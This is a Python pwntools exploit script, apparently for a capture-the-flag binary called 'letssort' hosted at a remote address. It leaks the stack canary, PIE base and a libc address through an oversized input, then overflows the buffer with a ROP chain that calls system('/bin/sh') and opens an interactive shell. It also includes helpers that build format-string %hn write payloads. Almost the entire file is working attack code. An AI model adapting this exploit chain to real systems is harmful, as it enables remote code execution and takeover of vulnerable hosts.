#!/usr/bin/python
# encoding: utf-8
from  pwn import *
import time
import sys
import random
binaire='letssort'
TIME=0.2
if (len(sys.argv)>1):
    elf=ELF(binaire)
    libc=ELF('libc.so.6')
#    libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
    host='localhost'
    port=59994
    diff=0
else:
    elf=ELF(binaire)
    libc=ELF('libc.so.6')
    host='89.38.210.128'
    port=1338
    diff=1
    

def hexa(c):
    s=hex(ord(c))[2:]
    if (len(s) == 1):
        s="0"+s
    return(s)


def toprint(c):
    if ((ord(c) < 32) or (ord(c) > 128)):
        return(".")
    else:
        return(c)

def baseN(num,b,nb=8,sg=0):
        n=num
        if ((sg>0) and (n<0)):
            ss="-"
            n=-n
        else:
            ss=""
        s=""
        while (n < 0):
                n = n + (b**nb)
        numerals="0123456789abcdefghijklmnopqrstuvwxyz"
        while((nb>0) or (n != 0)):
                s=numerals[n % b]+s
                n=n//b
                nb=nb-1
        return ss+s

def dump(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,8)+" : "),
        print hexa(buffer[l]),
        s=s+toprint(buffer[l])
        l=l+1
        if (l % 4 == 0):
            print " ",
            s=s+" "
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",s
            s=""
    print " ",s
def word(t):
    p=1
    s=0
    for i in range(4):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def bword(t):
    p=1
    s=0
    for i in range(8):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def complete(t,l,c="\x00"):
    if (len(t)< l):
        return(t+(l-len(t))*c)
    else:
        return(t)


def dumpg(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16),
#        s=s+toprint(buffer[l])
        l=l+8
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",""
    print " "
def dumpgc(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %8 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16)
        l=l+8
#        s=s+toprint(buffer[l])
    print " "

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)
# routine de format

def strl(n,l=5):
    s=str(n)
    s="0"*max(0,l-len(s))+s
    return(s)

def fmt(x):
    if (x < 8):
        return("A"*x)
    return("%"+str(x)+"x")


def lchaine(lwhat,offset,nb=4):
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$hn"
    for c in lnom:
        fm=fmt(c[0]-ind)+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

def lchaineverif(lwhat,offset,nb=4):
    if (nb==4):
        vv='8x'
    else:
        vv='lx'
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$"+vv
    for c in lnom:
        fm="F"*len(fmt(c[0]-ind))+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

debug=1

def pdebug(s):
    if (debug==1):
        print s
    return(s)

def tolibc(s):
    return(libc.sym[s]-libc.sym[reference_libc]+adr_reference_libc)

def adlibc(a):
    return(a-libc.sym[reference_libc]+adr_reference_libc)


def whatis(s):
    print s," = ",hex(tolibc(s))




so="I Really LOVE soRting ALgoRithMs!"
s=so[4:]+so[0:4]
sp="}"
i=0
for c in s:
    sp=sp+c+" "+chr(65+i)
    i=i+1
    sp=sp

    
def trie(s):
    sp=s+s
    l=[sp[i+1:]+'}'+sp[i] for i in range(len(s))]
    l.sort()
    r=""
    for t in l:
        r=r+t[-1]
    return(r[:len(s)],l)


p=remote(host,port)
def test(s):
    print "s=",s
    print "accueil ->",
    p.sendline("5000")
    time.sleep(TIME)
    p.sendline(s)
    time.sleep(TIME)
    b=p.recv(65555)
    print "reponse ->",b
    print "*************"
    return(b)

poprdi=0x0000000000001243 # : pop rdi ; ret

print test("glopglop")

fuite=1024+128
leak="a\x00"+"b"*fuite
b=test(leak)
print b
b=b[1024:]
b=b+"\x00"*(8-(len(b)%8))
dumpg(0,b)
# rbp?  canari return __libc_start_main + 241
canari=bword(b[8:16])
pie=bword(b[16:24])-0x11e0
print "canari=",hex(canari)
print "pie=",hex(pie)
print "fuite libc=",hex(bword(b[24:32]))
reference_libc='__libc_start_main'
adr_reference_libc=bword(b[24:32])-241
adr_reference_libc=(adr_reference_libc & 0xffffffffffffff00) + (libc.sym[reference_libc] & 0xff)
whatis('system')

mor=0
decalage="a"*mor+ "}"*(2048-2-0x5b-mor)
payload = decalage+p64(canari)+p64(0xcafebabe)+p64(pie+poprdi)+p64(adlibc(libc.data.index("/bin/sh\x00")))+p64(tolibc('system'))
print "*******payload"
b=test(sp+"\x00"+payload)
b=b+"\x00"*(8-(len(b)%8))
print "longueur:",len(b)
dumpg(0,b)

###
print "*******phase1"
print test("eeee"+"\x00")
print "*******phase2"
print test("RRR"+"\x00")
print "*******phase3"
print test("  "+"\x00")

p.sendline("-1")
p.sendline("I"+"\x00")
p.interactive()
